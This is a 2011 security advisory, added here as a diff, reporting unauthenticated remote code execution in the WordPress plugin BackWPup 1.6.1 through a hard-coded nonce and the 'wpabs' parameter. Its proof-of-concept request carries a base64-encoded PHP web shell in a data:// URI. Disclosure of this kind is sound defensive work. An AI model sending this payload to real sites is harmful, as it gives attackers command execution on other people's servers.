@@ -1,0 +1,51 @@
+Sense of Security - Security Advisory - SOS-11-003
+
+Release Date.                  28-Mar-2011
+Last Update.                   -
+Vendor Notification Date.      25-Mar-2010
+Product.                       Wordpress Plugin BackWPup
+Platform.                      Independent
+Affected versions.             1.6.1 (verified), possibly others
+Severity Rating.               High
+Impact.                        System Access
+Attack Vector.                 Remote without authentication
+Solution Status.               Upgrade to version 1.7.1
+CVE reference.                 Not yet assigned
+
+Details.
+A vulnerability has been discovered in the Wordpress plugin BackWPup 
+1.6.1 which can be exploited to execute local or remote code on the web 
+server. The Input passed to the component "wp_xml_export.php" via the 
+"wpabs" variable allows the inclusion and execution of local or remote 
+PHP files as long as a "_nonce" value is known. The "_nonce" value 
+relies on a static constant which is not defined in the script meaning 
+that it defaults to the value "822728c8d9".
+
+Proof of Concept.
+wp_xml_export.php?_nonce=822728c8d9&wpabs=data://text/plain;base64,PGZ
+vcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2bIiBtZX           
+Rob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4Ij48aW5wdXQgdHlwZT0   
+ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2bPHByZT48PyAKZWNobyBgeyRfUE9TVF
+sneCddfWA7ID8%2bPC9wcmU%2bPD8gZGllKCk7ID8%2bCgo%3d
+
+Solution.
+Upgrade to version 1.7.1
+
+Discovered by.
+Phil Taylor - Sense of Security Labs.
+
+Sense of Security Pty Ltd
+Level 8, 66 King St
+Sydney NSW 2000
+AUSTRALIA
+T: +61 (0)2 9290 4444
+F: +61 (0)2 9290 4455
+W: http://www.senseofsecurity.com.au
+E: info@senseofsecurity.com.au
+Twitter: @ITsecurityAU
+
+The latest version of this advisory can be found at:
+http://www.senseofsecurity.com.au/advisories/SOS-11-003.pdf
+
+Other Sense of Security advisories can be found at:
+http://www.senseofsecurity.com.au/research/it-security-advisories.php
